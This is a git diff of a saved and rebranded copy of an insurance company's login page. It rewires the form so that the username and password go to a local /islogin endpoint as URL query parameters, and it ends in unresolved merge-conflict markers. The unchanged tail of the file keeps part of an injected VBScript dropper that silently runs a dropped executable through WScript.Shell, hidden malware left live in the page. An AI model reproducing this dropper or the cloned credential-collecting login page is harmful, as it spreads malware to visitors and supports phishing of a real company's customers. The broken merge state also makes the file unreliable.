@@ -1,11 +1,8 @@
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "//www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <!-- saved from url=(0249)https://baoxian.pingan.com/customer/toLogin.do?type=10&target=http%3A%2F%2Fbaoxian.pingan.com%2Fcpbaoxian%2Fsem%2F141125zongheyiwaixian%2Findex.shtml%3FWT.mc_id%3DT00-BD-155-051-003570%26WT.srch%3D1%26gclid%3DCOSblsuskuICFZFhvAodLTUD_A%26gclsrc%3Dds -->
-<html xmlns="//www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<html lang="en" xmlns:th="http://www.thymeleaf.org"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 		<title>喵喵理赔服务_理赔进度查询-喵喵理财官方直销网站</title>
-		<meta name="keywords" content="喵喵理赔服务、理赔进度查询">
-		<meta name="description" content="中国喵喵官方直销网站的理赔服务进度查询，让您随时了解您的理赔服务进度。买保险，理赔快，就选喵喵，省心又省钱！">
-		<meta content="zh-cn" http-equiv="content-language">		
-		<meta content="本页版权归中国喵喵所有。all rights reserved" name="copyright">
+		<script type="text/javascript" src="js/jquery-1.8.3.js" ></script>
 		<meta name="WT.channel" content="pingan">
 		<link rel="stylesheet" href="/client_resources/css/base.css">
 		<link rel="stylesheet" href="/client_resources/css/public.css">
@@ -30,7 +27,8 @@
 			}
 		</style>
 			
-		<script src="client_resources/js/hm.js.下载"></script><script type="text/javascript">
+		<script src="client_resources/js/hm.js.下载"></script>
+		<script type="text/javascript">
 			 // 退出一账通系统
 		     function oneAccountLogout(callback) {
 				var iframe = document.createElement("iframe");
@@ -136,14 +134,18 @@
 			}
 		</script>
 
-	<script></script><script src="client_resources/js/toa.js.下载"></script><script src="client_resources/js/pa_ui_validator.js.下载" type="text/javascript"></script><script src="client_resources/js/pa_ui_misc.js.下载" type="text/javascript"></script><script src="client_resources/js/web.js.下载"></script><script type="text/javascript" async="" src="client_resources/js/sdc9.js.下载"></script><script src="client_resources/js/iw_cookie.js.下载"></script><script type="text/javascript" async="" src="client_resources/js/sdc9.js.下载"></script><script charset="UTF-8" async="" src="client_resources/php/gettype.php"></script><script charset="UTF-8" async="" src="client_resources/js/fullpage.pingan.1.0.js.下载"></script><script charset="UTF-8" src="client_resources/php/get.php"></script><link href="/client_resources/css/style_https.1.4.3.css" rel="stylesheet"><script charset="UTF-8" src="client_resources/php/reset.php"></script></head>
+	<script>
+		function login1(){
+			var username=$("#username").val();
+			var userpwd=$("#userpwd").val();
+			location.href="/islogin?username="+username+"&userpwd="+userpwd;
+		}
+		
+	</script>
+	
+	</head>
 	<body id="simple_b_wrapper" style="min-width:1200px">
 
-		<!-- START: 隐藏域 -->
-		<input type="hidden" id="actionSource" value="">
-		<!-- END: 隐藏域 -->
-
-		<!-- START: 公用头部 -->
 
 		<div class="b_5s_f63">
 			<div class="header_signUp">
@@ -202,7 +204,7 @@
 										<td width="290px">
 										<div class="inputline user dib">
 											<span class="pic01"></span>
-											<input pa_ui_name="validator" name="userID" placeholder="账号" otitle="用户名" title="用户名" maxlength="100" type="text" id="userID" value="" style="width: 180px;background-color: #fff;" pa_ui_valid_tipbox="sysTip" pa_ui_valid_csselerror="valid_csselerror" class="pa_ui_element_normal">
+											<input  name="username" placeholder="账号" otitle="用户名" title="用户名" maxlength="100" type="text" id="username" value="" style="width: 180px;background-color: #fff;" class="pa_ui_element_normal">
 										</div></td>
 									</tr>
 									<!-- <tr height="30px"></tr> -->
@@ -210,7 +212,8 @@
 										<td>
 										<div id="pwdArea" class="inputline password dib por">
 											<span class="pic02"></span>
-											<input type="password" placeholder="密码" style="width:140px;" pa_ui_name="validator,keyboard" id="v_password" title="密码" otitle="密码" maxlength="16" onkeydown="if(event.keyCode == 13){clickSubmit();}" pa_ui_valid_tipbox="sysTip" pa_ui_keyboard_position="k1" pa_ui_keyboard_trigger="2" pa_ui_valid_csselerror="valid_csselerror" class="pa_ui_element_normal"><button type="button" class="pa_ui_keyboard_click" aria-label="软键盘输入"></button>
+											<input type="password" placeholder="密码" style="width:140px;" name="userpwd" id="userpwd" title="密码" otitle="密码" maxlength="16" onkeydown="if(event.keyCode == 13){clickSubmit();}" pa_ui_valid_tipbox="sysTip" pa_ui_keyboard_position="k1" pa_ui_keyboard_trigger="2" pa_ui_valid_csselerror="valid_csselerror" class="pa_ui_element_normal">
+											<button type="button" class="pa_ui_keyboard_click" aria-label="软键盘输入"></button>
 										</div>
 										<div style="display:block;clear:both;">
 											<div class="keybox" id="k1"></div>
@@ -238,7 +241,7 @@
 									<tr>
 										<td align="center" style="position:relative;overflow:hidden;">
 										<i id="get_k_frames" class="get_k_frames"></i>
-										<a href="javascript:;" style="margin-left:-20px;" onclick="return false;" class="btn_submit" title="登录" otitle="登录" id="loginlink">登录</a></td>
+										<button th:onclick="login1();" style="margin-left:-20px;" class="btn_submit" title="登录" otitle="登录">登录</button></td>
 									</tr>
 									<tr height="14px"></tr>
 									<tr>
@@ -463,6 +466,7 @@
 		<script type="text/javascript" src="client_resources/js/interfaceLogin.js.下载"></script>
 		<script type="text/javascript" src="client_resources/js/gt.js.下载"></script>
 		<script type="text/javascript" src="client_resources/js/swiperlogin.js.下载"></script>
+<<<<<<< HEAD
 		<!-- <script type="text/javascript">
 		(function() {
 			if(InterfaceLoginObj.targetUrl.indexOf("baoxian.pingan.com")!=-1 ){
@@ -497,3 +501,6 @@ End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
 //--></SCRIPT>
+=======
+<div class="geetest_panel geetest_wind geetest_classical" style="display: none;"><div class="geetest_panel_ghost"></div><div class="geetest_panel_box"><div class="geetest_other_offline geetest_panel_offline"></div><div class="geetest_panel_loading"><img class="geetest_panel_loading_img"><div class="geetest_panel_loading_icon"></div><div class="geetest_panel_loading_content">智能验证检测中</div></div><div class="geetest_panel_success"><img class="geetest_panel_success_img"><div class="geetest_panel_success_custombox"></div><div class="geetest_panel_success_box"><div class="geetest_panel_success_show"><div class="geetest_panel_success_pie"></div><div class="geetest_panel_success_filter"></div><div class="geetest_panel_success_mask"></div></div><div class="geetest_panel_success_correct"><div class="geetest_panel_success_icon"></div></div></div><div class="geetest_panel_success_title">验证成功</div></div><div class="geetest_panel_error"><div class="geetest_panel_error_icon"></div><div class="geetest_panel_error_title">网络超时</div><div class="geetest_panel_error_content">请点击此处重试</div><div class="geetest_panel_error_code"></div></div><div class="geetest_panel_footer" style="display: none;"><div class="geetest_panel_footer_logo"></div><div class="geetest_panel_footer_copyright">undefined</div></div><div class="geetest_panel_next"></div></div></div></body></html>
+>>>>>>> branch 'dev' of https://github.com/moao1218/saonan.git
